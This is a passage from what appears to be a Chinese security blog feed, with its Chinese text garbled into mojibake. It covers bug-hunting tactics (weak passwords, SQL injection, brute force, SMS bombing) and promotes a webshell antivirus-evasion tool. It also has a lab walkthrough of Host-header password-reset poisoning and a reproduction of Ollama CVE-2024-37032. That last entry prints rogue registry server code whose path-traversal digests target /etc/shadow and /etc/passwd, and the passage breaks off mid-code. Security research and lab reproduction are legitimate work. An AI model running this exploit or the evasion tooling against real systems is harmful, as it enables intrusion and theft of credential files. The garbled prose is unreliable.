ç”¨æˆ·åŠŸèƒ½</h2><p>å°±æ˜¯è¿™ä¸ªç³»ç»Ÿæœ‰äº¤äº’ï¼Œä½†æ˜¯æ²¡æœ‰ç”¨æˆ·ç™»é™†ï¼Œæƒé™åˆ’åˆ†è¿™ç§ã€‚è¿™ç§ä¸€èˆ¬å°±å¯¹ç€äº¤äº’åŠŸèƒ½æµ‹è¯•å°±è¡Œï¼Œèƒ½åšçš„äº‹æƒ…ä¹Ÿç®—æ¯”è¾ƒå±€é™ï¼Œæ‰«æ‰«ç›®å½•ã€æµ‹æµ‹äº¤äº’ã€çœ‹çœ‹jsä»£ç è¿™äº›ï¼Œå…·ä½“çš„åšæ³•çœ‹ä¸‹é¢æœ‰ç”¨æˆ·åŠŸèƒ½å¤„çš„å†…å®¹ã€‚</p><p>è¿™ç§ä¹Ÿæ˜¯æœ‰å‡ºæ´çš„å¯èƒ½æ€§ï¼Œæˆ‘ä¹‹å‰æµ‹åˆ°è¿‡SQLæ³¨å…¥ã€‚</p><p>é™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥åšèµ„äº§å‡çº§ï¼Œå°±æ˜¯æ‰¾ç”¨æˆ·æƒé™çš„åŠŸèƒ½ç‚¹ï¼Œæ‰«ç›®å½•ã€çœ‹çœ‹ admin.phpã€&#x2F;admin ã€&#x2F;loginè¿™äº›è·¯å¾„ä¼šä¸ä¼šå‡ºä¸€ä¸ªç”¨æˆ·ç™»å½•å…¥å£ï¼Œå˜æˆæœ‰ç”¨æˆ·åŠŸèƒ½çš„ç«™ç‚¹èµ„äº§ã€‚</p><h2 id="2ã€æœ‰ç”¨æˆ·åŠŸèƒ½"><a href="#2ã€æœ‰ç”¨æˆ·åŠŸèƒ½" class="headerlink" title="2ã€æœ‰ç”¨æˆ·åŠŸèƒ½"></a>2ã€æœ‰ç”¨æˆ·åŠŸèƒ½</h2><p>ç»å…¸çš„å¼€å±€ä¸€ä¸ªç™»é™†æ¡†ï¼Œå°±æ˜¯è¿™ç±»æœ‰ç”¨æˆ·åŠŸèƒ½çš„èµ„äº§ï¼Œä½†æ˜¯å’±ä»¬åˆæ²¡æœ‰ç”¨æˆ·çš„è´¦å·å¯†ç ï¼Œè¿›ä¸å»ç½‘ç«™ï¼Œæˆ‘ä»¬åœ¨å®æˆ˜ä¸­é‡åˆ°çš„èµ„äº§70%ä»¥ä¸Šéƒ½æ˜¯è¿™ç§ã€‚</p><p>è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦æ‰©å¤§æˆ‘ä»¬çš„ä¿¡æ¯é¢ï¼Œèƒ½åšçš„äº‹æƒ…æœ‰ï¼š</p><ol><li>å¼±å£ä»¤ã€SQLæ³¨å…¥ã€SQLä¸‡èƒ½å¯†ç ã€ç”¨æˆ·åå¯†ç çˆ†ç ´</li><li>Googleè¯­æ³•ã€ç¤¾å·¥æœç´¢ç”¨æˆ·åå¯†ç ã€é»˜è®¤å¯†ç </li><li>æ‰«ç›®å½•ï¼Œçœ‹æœ‰æ²¡æœ‰å…¶ä»–çš„åŠŸèƒ½ç•Œé¢</li><li>çœ‹JSä»£ç ï¼Œæœ‰æ²¡æœ‰æ•æ„Ÿä¿¡æ¯ã€apiæ¥å£</li><li>å¦‚æœæœ‰APIæ¥å£è·¯ç”±ï¼Œå¯ä»¥å†æµ‹è¯•æœªæˆæƒè¿™ç§</li><li>é€»è¾‘æ¼æ´ç›¸å…³æµ‹è¯•ï¼ŒéªŒè¯ç ã€ç™»é™†ç»•è¿‡ã€çŸ­ä¿¡è½°ç‚¸é‚£äº›</li><li>æ³¨å†ŒåŠŸèƒ½çš„åˆ©ç”¨ï¼Œé€šè¿‡registerå…³é”®å­—æ‰¾æ³¨å†Œç‚¹</li><li>æŒ‡çº¹è¯†åˆ«ï¼Œå¦‚æœä½¿ç”¨äº†æŸä¸ªæ¡†æ¶ï¼ŒæŸ¥å†å²æ¼æ´</li><li>fofaæœç´¢åŒç±»å‹ç«™ç‚¹ï¼Œè§‚å¯Ÿæœ‰æ— éšè—çš„äº¤äº’åŠŸèƒ½</li></ol><p>å¦‚æœæˆ‘ä»¬èƒ½é€šè¿‡æ³¨å†Œç”¨æˆ·ã€ç™»é™†ç»•è¿‡æˆ–è€…å…¶ä»–çš„æ–¹å¼è¿›å…¥ç«™ç‚¹å†…éƒ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æå‡èµ„äº§åˆ°ä¸‰ç±»èµ„äº§ã€‚</p><h1 id="äº”ã€ä¸‰ç±»èµ„äº§æ‰“æ³•"><a href="#äº”ã€ä¸‰ç±»èµ„äº§æ‰“æ³•" class="headerlink" title="äº”ã€ä¸‰ç±»èµ„äº§æ‰“æ³•"></a>äº”ã€ä¸‰ç±»èµ„äº§æ‰“æ³•</h1><p>å½“æˆ‘ä»¬æ¥åˆ°ä¸‰ç±»èµ„äº§ï¼Œä¹Ÿå°±æ˜¯åœ¨è¿™ä¸ªç«™ç‚¹ä¸Šï¼Œæˆ‘ä»¬æ˜¯æœ‰ç”¨æˆ·æƒé™çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬èƒ½æµ‹çš„èŒƒå›´å°±å¾ˆå¤§äº†ã€‚ç«™ç‚¹å†…éƒ¨æœ‰ç›¸å½“å¤šçš„åŠŸèƒ½ï¼Œèµ·ç çš„ç”¨æˆ·ä¸ªäººä¿¡æ¯è¿™å—ï¼Œå¤´åƒä¸Šä¼ ã€å¯†ç ä¿®æ”¹çš„ç›¸å…³åŠŸèƒ½å°±æœ‰å¾ˆå¤šæµ‹è¯•ç‚¹ã€‚ä¸€èˆ¬ç”¨æˆ·ç«™ç‚¹éƒ½æ˜¯åŒºåˆ†ç®¡ç†å‘˜ç”¨æˆ·å’Œéç®¡ç†å‘˜ç”¨æˆ·ï¼Œè¿™é‡Œä¸å±•å¼€åŒºåˆ†ï¼Œæµ‹è¯•æ–¹æ³•æ˜¯ä¸€æ ·çš„ã€‚</p><p>åœ¨å®æˆ˜å½“ä¸­ï¼Œå¦‚æœè¿™ä¸ªç«™ç‚¹æ˜¯å¤–ç½‘èµ„äº§ï¼Œå¾€å¾€ä¼šæœ‰WAFæˆ–å…¶ä»–é˜²æŠ¤çš„å®‰å…¨æªæ–½ï¼ŒåƒSQLæ³¨å…¥ã€XSSç›¸å…³çš„payloadå¾ˆéš¾æ‰“å…¥ã€‚å› æ­¤åœ¨ä¸‰ç±»èµ„äº§ä¸­ï¼Œæˆ‘ä»¬æ›´å…³æ³¨ä»–çš„æƒé™é—®é¢˜ï¼Œåƒæœªæˆæƒã€è¶Šæƒã€æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹‹ç±»çš„æ¼æ´ã€‚å½“ç„¶ï¼Œå¦‚æœæ˜¯å†…ç½‘æ²¡æœ‰é˜²æŠ¤æªæ–½çš„ç«™ç‚¹å¦è¯´ã€‚</p><p>ä¸€èˆ¬è§„æ¨¡ä¸å°çš„ç«™ç‚¹ï¼Œä»–çš„æƒé™å¾€å¾€æ˜¯ä¼šå­˜åœ¨æŸäº›é—®é¢˜çš„ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œä¹Ÿä¸èƒ½ä»…ä»…å±€é™äºæƒé™æ–¹é¢çš„æµ‹è¯•ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸»åŠ¨çš„å‘æ•£æ€ç»´ï¼Œå»å¯»æ‰¾æ›´å¤šçš„å¯èƒ½æ€§ï¼Œå¾€å¾€ä¼šå¸¦æ¥æ›´å¤šçš„æƒŠå–œã€‚</p><h1 id="å…­ã€ç»“å°¾"><a href="#å…­ã€ç»“å°¾" class="headerlink" title="å…­ã€ç»“å°¾"></a>å…­ã€ç»“å°¾</h1><p>å½“æˆ‘ä»¬å°†æ”¶é›†åˆ°çš„èµ„äº§åšå¥½èµ„äº§ç­‰çº§çš„åˆ’åˆ†ï¼Œä¼šè®©æˆ‘ä»¬å¯¹èµ„äº§ä¼šæœ‰æ›´åŠ æ¸…æ™°çš„è®¤çŸ¥ï¼Œåœ¨æ¼æ´æŒ–æ˜çš„è¿‡ç¨‹ä¸­ä¼šæ›´åŠ çš„å¾—å¿ƒåº”æ‰‹ã€‚å¦‚æ­¤å¾€å¤ä¸€æ®µæ—¶é—´ï¼Œæ¼æ´æŒ–æ˜å¿…ç„¶ä¼šæ›´åŠ çš„å¨´ç†Ÿã€‚</p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…æ€ä¸“æ ã€‘Webshell æŒç»­å…æ€-XG_NTAI</title>
      <link href="/2025/05/03/Anti-AntiVirus-Webshell-XG-NTAI/"/>
      <url>/2025/05/03/Anti-AntiVirus-Webshell-XG-NTAI/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€XG-NTAIå…æ€ä»‹ç»"><a href="#ä¸€ã€XG-NTAIå…æ€ä»‹ç»" class="headerlink" title="ä¸€ã€XG_NTAIå…æ€ä»‹ç»"></a>ä¸€ã€XG_NTAIå…æ€ä»‹ç»</h1><p>ç”¨äºWebshellæœ¨é©¬å…æ€ã€æµé‡åŠ å¯†ä¼ è¾“</p><p>å…æ€å†°èã€å“¥æ–¯æ‹‰ç­‰Webshellçš„ASPã€PHPã€JSPæœ¨é©¬æ–‡ä»¶ï¼Œç”Ÿæˆå†°èæµé‡åŠ å¯†ä¼ è¾“é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ¬å·¥å…·ä»…ç”¨äºæˆæƒæµ‹è¯•ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”</span><br></pre></td></tr></table></figure><p>è¯¥å·¥å…·æ—©åœ¨ä»¥å‰å°±æœ‰å…³æ³¨ï¼Œé‚£æ—¶å€™çš„XG_NTAIæ‰åˆ°1.3ç‰ˆæœ¬ï¼Œå¦‚ä»Šéƒ½æ›´æ–°åˆ°äº†2.5ç‰ˆæœ¬ï¼Œåœ°å€ï¼š<a href="https://github.com/xiaogang000/XG_NTAI">xiaogang000&#x2F;XG_NTAI: ç”¨äºWebshellæœ¨é©¬å…æ€ã€æµé‡åŠ å¯†ä¼ è¾“ï¼Œå¤šå¤šæ”¯æŒstar</a></p><h1 id="äºŒã€ä½¿ç”¨ç¤ºä¾‹"><a href="#äºŒã€ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="äºŒã€ä½¿ç”¨ç¤ºä¾‹"></a>äºŒã€ä½¿ç”¨ç¤ºä¾‹</h1><p>æœ‰ç©ºå†æ</p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ä¸“æ  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘Hostå¤´æ”»å‡»</title>
      <link href="/2025/03/19/VulnRep-host-header-attack/"/>
      <url>/2025/03/19/VulnRep-host-header-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="é›¶ã€Hostå¤´æ”»å‡»ç®€ä»‹"><a href="#é›¶ã€Hostå¤´æ”»å‡»ç®€ä»‹" class="headerlink" title="é›¶ã€Hostå¤´æ”»å‡»ç®€ä»‹"></a>é›¶ã€Hostå¤´æ”»å‡»ç®€ä»‹</h1><p>å¦‚æœæœåŠ¡å™¨ç›´æ¥ä¿¡ä»»Hostå¤´ï¼Œæœªæ ¡éªŒå®ƒçš„åˆæ³•æ€§ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿä½¿ç”¨æ­¤å¯æ§å˜é‡æ¥æ³¨å…¥Hostï¼Œä»¥æ“çºµæœåŠ¡å™¨ç«¯çš„è¡Œä¸ºã€‚å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://_SERVER[&#x27;HOST&#x27;]/support&quot;&gt;è”ç³»æ”¯æŒ&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>ç”±äºHostå¤´å®é™…ä¸Šæ˜¯ç”¨æˆ·å¯æ§åˆ¶çš„ï¼Œå› æ­¤è¿™ç§åšæ³•å¯èƒ½å¯¼è‡´è®¸å¤šé—®é¢˜ã€‚å¦‚æœæœªæ ¡éªŒæˆ–è€…ç›´æ¥ä½¿ç”¨Hostå¤´ï¼Œåˆ™Hostå¤´å¯ä»¥ä¸ä¸€ç³»åˆ—å…¶ä»–æ¼æ´â€œç»„åˆæ‹³â€æ”»å‡»ï¼Œæ¯”å¦‚ï¼š</p><ul><li>ç¼“å­˜æŠ•æ¯’</li><li>ç‰¹æ®Šä¸šåŠ¡åŠŸèƒ½çš„é€»è¾‘æ¼æ´</li><li>åŸºäºè·¯ç”±çš„SSRF</li><li>ç»å…¸æœåŠ¡ç«¯æ¼æ´ï¼Œå¦‚SQLæ³¨å…¥ï¼ˆå½“Hostè¢«ç”¨äºSQLè¯­å¥æ—¶ï¼‰ç­‰</li></ul><h1 id="ä¸€ã€å¯†ç é‡ç½®ä¸­æ¯’"><a href="#ä¸€ã€å¯†ç é‡ç½®ä¸­æ¯’" class="headerlink" title="ä¸€ã€å¯†ç é‡ç½®ä¸­æ¯’"></a>ä¸€ã€å¯†ç é‡ç½®ä¸­æ¯’</h1><p>æ¥åˆ°<a href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning">Burpé¶åœº</a>ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªç”¨æˆ·<code>wiener:peter</code>ï¼Œç™»é™†é¶åœºåå¯ä»¥çœ‹åˆ°è‡ªå·±çš„é‚®ç®±</p><p><img src="/img/VulnRep-host-header-attack/image-20250319172320908.png" alt="image-20250319172320908"></p><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯å¿˜è®°å¯†ç çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦é€€å‡ºç™»å½•ä¹‹åï¼Œé‡ç½®å¯†ç </p><p><img src="/img/VulnRep-host-header-attack/image-20250319172502735.png" alt="image-20250319172502735"></p><p>æ³¨æ„åˆ°Hoståœ°å€æ˜¯ï¼š<code>0ae700bf042376a285c94e25009000f7.web-security-academy.net</code></p><p>è¿”å›æŸ¥çœ‹æˆ‘ä»¬çš„é‚®ç®±ï¼š<a href="https://exploit-0ac9003c0440762285f64d3001a600ed.exploit-server.net/email">https://exploit-0ac9003c0440762285f64d3001a600ed.exploit-server.net/email</a></p><p><img src="/img/VulnRep-host-header-attack/image-20250319174405505.png" alt="image-20250319174405505"></p><p>æˆ‘ä»¬å°è¯•ä¿®æ”¹Hostï¼Œæ”¾åŒ…åˆ°é‡æ”¾å™¨ï¼Œä¿®æ”¹Host å¤´ï¼Œæ”¾åŒ…æŸ¥çœ‹é‚®ç®±</p><p><img src="/img/VulnRep-host-header-attack/image-20250319175205058.png" alt="image-20250319175205058"></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸä¿®æ”¹Hostå¤´</p><p><img src="/img/VulnRep-host-header-attack/image-20250319175235352.png" alt="image-20250319175235352"></p><p>æˆ‘ä»¬ä¿®æ”¹Hostå¤´ä¸ºæˆ‘ä»¬è‡ªå·±çš„ä¸»æœº</p><p>ä¸»æœºåœ°å€ï¼š<a href="https://exploit-0ac9003c0440762285f64d3001a600ed.exploit-server.net/">https://exploit-0ac9003c0440762285f64d3001a600ed.exploit-server.net/</a></p><p><img src="/img/VulnRep-host-header-attack/image-20250319175839822.png" alt="image-20250319175839822"></p><p>å¹¶ä¿®æ”¹ä¸ºå—å®³äººå§“å</p><p><img src="/img/VulnRep-host-header-attack/image-20250319180157294.png" alt="image-20250319180157294"></p><p>ä¹‹åæŸ¥çœ‹æˆ‘ä»¬çš„ä¸»æœºæ—¥å¿—ï¼ŒæˆåŠŸæ‹¿åˆ°é‡ç½®å¯†ç é“¾æ¥çš„tokenå€¼</p><p><img src="/img/VulnRep-host-header-attack/image-20250319180323139.png" alt="image-20250319180323139"></p><p>ä¹‹åä¿®æ”¹é‡ç½®å¯†ç é“¾æ¥çš„tokenå€¼ï¼Œä¹‹åå°±å¯ä»¥é‡ç½®carlos ç”¨æˆ·çš„å¯†ç ï¼Œè¿›è€Œç™»é™†è¯¥è´¦æˆ·</p><p><img src="/img/VulnRep-host-header-attack/image-20250319181821957.png" alt="image-20250319181821957"></p><h1 id="äºŒã€Hostå¤´æ”»å‡»-ç¼“å­˜æŠ•æ¯’"><a href="#äºŒã€Hostå¤´æ”»å‡»-ç¼“å­˜æŠ•æ¯’" class="headerlink" title="äºŒã€Hostå¤´æ”»å‡»+ç¼“å­˜æŠ•æ¯’"></a>äºŒã€Hostå¤´æ”»å‡»+ç¼“å­˜æŠ•æ¯’</h1><p>æœ‰æ—¶é—´å†å¤ç°</p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hostå¤´æ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘Ollamaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2024-37032ï¼‰</title>
      <link href="/2025/02/26/VulnRep-ollama/"/>
      <url>/2025/02/26/VulnRep-ollama/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Ollamaç®€ä»‹"><a href="#ä¸€ã€Ollamaç®€ä»‹" class="headerlink" title="ä¸€ã€Ollamaç®€ä»‹"></a>ä¸€ã€Ollamaç®€ä»‹</h1><p>Ollamaæ˜¯ä¸€ä¸ªä¸“ä¸ºåœ¨æœ¬åœ°ç¯å¢ƒä¸­è¿è¡Œå’Œå®šåˆ¶å¤§å‹è¯­è¨€æ¨¡å‹è€Œè®¾è®¡çš„å·¥å…·ã€‚å®ƒæä¾›äº†ä¸€ä¸ªç®€å•é«˜æ•ˆçš„æ¥å£ï¼Œç”¨äºåˆ›å»ºã€è¿è¡Œå’Œç®¡ç†è¿™äº›æ¨¡å‹ï¼ŒåŒæ—¶è¿˜æä¾›äº†ä¸€ä¸ªä¸°å¯Œçš„é¢„æ„å»ºæ¨¡å‹åº“ï¼Œå¯ä»¥è½»æ¾é›†æˆåˆ°å„ç§åº”ç”¨ç¨‹åºä¸­ã€‚Ollamaçš„ç›®æ ‡æ˜¯ä½¿å¤§å‹è¯­è¨€æ¨¡å‹çš„éƒ¨ç½²å’Œäº¤äº’å˜å¾—ç®€å•ï¼Œæ— è®ºæ˜¯å¯¹äºå¼€å‘è€…è¿˜æ˜¯å¯¹äºç»ˆç«¯ç”¨æˆ·ã€‚</p><h1 id="äºŒã€Ollamaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2024-37032ï¼‰"><a href="#äºŒã€Ollamaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2024-37032ï¼‰" class="headerlink" title="äºŒã€Ollamaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2024-37032ï¼‰"></a>äºŒã€Ollamaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2024-37032ï¼‰</h1><p><strong>æ¼æ´ç¼–å·ï¼šCVE-2024-37032</strong> è¯¥æ¼æ´å…è®¸é€šè¿‡è·¯å¾„<a href="https://so.csdn.net/so/search?q=%E9%81%8D%E5%8E%86&spm=1001.2101.3001.7020">éå†</a>ä»»æ„å†™å…¥æ–‡ä»¶ã€‚digestå­—æ®µçš„éªŒè¯ä¸æ­£ç¡®ï¼ŒæœåŠ¡å™¨é”™è¯¯åœ°å°†æœ‰æ•ˆè´Ÿè½½è§£é‡Šä¸ºåˆæ³•çš„æ–‡ä»¶è·¯å¾„ï¼Œæ”»å‡»è€…å¯åœ¨digestå­—æ®µä¸­åŒ…å«è·¯å¾„éå†payloadçš„æ¶æ„æ¸…å•æ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´å®ç°ä»»æ„æ–‡ä»¶è¯»å–&#x2F;å†™å…¥æˆ–å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h1 id="ä¸‰ã€å½±å“ç‰ˆæœ¬"><a href="#ä¸‰ã€å½±å“ç‰ˆæœ¬" class="headerlink" title="ä¸‰ã€å½±å“ç‰ˆæœ¬"></a>ä¸‰ã€å½±å“ç‰ˆæœ¬</h1><p>Ollama &lt; 0.1.34</p><h1 id="å››ã€æ¼æ´å¤ç°"><a href="#å››ã€æ¼æ´å¤ç°" class="headerlink" title="å››ã€æ¼æ´å¤ç°"></a>å››ã€æ¼æ´å¤ç°</h1><h2 id="1ã€ç¬¬ä¸€æ­¥ï¼šæ­å»ºç¯å¢ƒ"><a href="#1ã€ç¬¬ä¸€æ­¥ï¼šæ­å»ºç¯å¢ƒ" class="headerlink" title="1ã€ç¬¬ä¸€æ­¥ï¼šæ­å»ºç¯å¢ƒ"></a>1ã€ç¬¬ä¸€æ­¥ï¼šæ­å»ºç¯å¢ƒ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama:0.1.33</span><br></pre></td></tr></table></figure><h2 id="2ã€ç¬¬äºŒæ­¥ï¼šå¼€å¯Rogue-registry-server"><a href="#2ã€ç¬¬äºŒæ­¥ï¼šå¼€å¯Rogue-registry-server" class="headerlink" title="2ã€ç¬¬äºŒæ­¥ï¼šå¼€å¯Rogue registry server"></a>2ã€ç¬¬äºŒæ­¥ï¼šå¼€å¯Rogue registry server</h2><p>åœ¨äº‘æœåŠ¡å™¨å¼€å¯server.py æ–‡ä»¶ï¼Œvpsæ”¹æˆæœåŠ¡å™¨çš„IPåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from fastapi import FastAPI, Request, Response</span><br><span class="line"></span><br><span class="line">HOST = &quot;vps&quot;</span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/&quot;)</span><br><span class="line">async def index_get():</span><br><span class="line">    return &#123;&quot;message&quot;: &quot;Hello rogue server&quot;&#125;</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/&quot;)</span><br><span class="line">async def index_post(callback_data: Request):</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    return &#123;&quot;message&quot;: &quot;Hello rogue server&quot;&#125;</span><br><span class="line"></span><br><span class="line"># for ollama pull</span><br><span class="line">@app.get(&quot;/v2/rogue/bi0x/manifests/latest&quot;)</span><br><span class="line">async def fake_manifests():</span><br><span class="line">    return &#123;&quot;schemaVersion&quot;:2,&quot;mediaType&quot;:&quot;application/vnd.docker.distribution.manifest.v2+json&quot;,&quot;config&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.docker.container.image.v1+json&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../etc/shadow&quot;,&quot;size&quot;:10&#125;,&quot;layers&quot;:[&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../../../../../../../tmp/notfoundfile&quot;,&quot;size&quot;:10&#125;,&#123;&quot;mediaType&quot;:&quot;application/vnd.docker.distribution.manifest.v2+json&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../etc/passwd&quot;,&quot;size&quot;:10&#125;,&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:f&quot;../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/&#123;HOST&#125;/rogue/bi0x/latest&quot;,&quot;size&quot;:10&#125;]&#125;</span><br><span class="line"></span><br><span class="line">@app.head(&quot;/etc/passwd&quot;)</span><br><span class="line">async def fake_passwd_head(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/etc/passwd&quot;, status_code=206)</span><br><span class="line">async def fake_passwd_get(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    response.headers[&quot;E-Tag&quot;] = &quot;\&quot;../../../../../../../../../../../../../etc/passwd\&quot;&quot;</span><br><span class="line">    return &#x27;cve-2024-37032-test&#x27;</span><br><span class="line"></span><br><span class="line">@app.head(f&quot;/root/.ollama/models/manifests/&#123;HOST&#125;/rogue/bi0x/latest&quot;)</span><br><span class="line">async def fake_latest_head(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.get(f&quot;/root/.ollama/models/manifests/&#123;HOST&#125;/rogue/bi0x/latest&quot;, status_code=206)</span><br><span class="line">async def fake_latest_get(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest&quot;</span><br><span class="line">    response.headers[&quot;E-Tag&quot;] = &quot;\&quot;../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest\&quot;&quot;</span><br><span class="line">    return &#123;&quot;schemaVersion&quot;:2,&quot;mediaType&quot;:&quot;application/vnd.docker.distribution.manifest.v2+json&quot;,&quot;config&quot;:&#123;&quot;mediaType&quot;:&quot;application/vnd.docker.container.image.v1+json&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../etc/shadow&quot;,&quot;size&quot;:10&#125;,&quot;layers&quot;:[&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../../../../../../../tmp/notfoundfile&quot;,&quot;size&quot;:10&#125;,&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:&quot;../../../../../../../../../../../../../etc/passwd&quot;,&quot;size&quot;:10&#125;,&#123;&quot;mediaType&quot;:&quot;application/vnd.ollama.image.license&quot;,&quot;digest&quot;:f&quot;../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/&#123;HOST&#125;/rogue/bi0x/latest&quot;,&quot;size&quot;:10&#125;]&#125;</span><br><span class="line"></span><br><span class="line">@app.head(&quot;/tmp/notfoundfile&quot;)</span><br><span class="line">async def fake_notfound_head(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../tmp/notfoundfile&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.get(&quot;/tmp/notfoundfile&quot;, status_code=206)</span><br><span class="line">async def fake_notfound_get(response: Response):</span><br><span class="line">    response.headers[&quot;Docker-Content-Digest&quot;] = &quot;../../../../../../../../../../../../../tmp/notfoundfile&quot;</span><br><span class="line">    response.headers[&quot;E-Tag&quot;] = &quot;\&quot;../../../../../../../../../../../../../tmp/notfoundfile\&quot;&quot;</span><br><span class="line">    return &#x27;cve-2024-37032-test&#x27;</span><br><span class="line"></span><br><span class="line"># for ollama push</span><br><span class="line">@app.post(&quot;/v2/rogue/bi0x/blobs/uploads/&quot;, status_code=202)</span><br><span class="line">async def 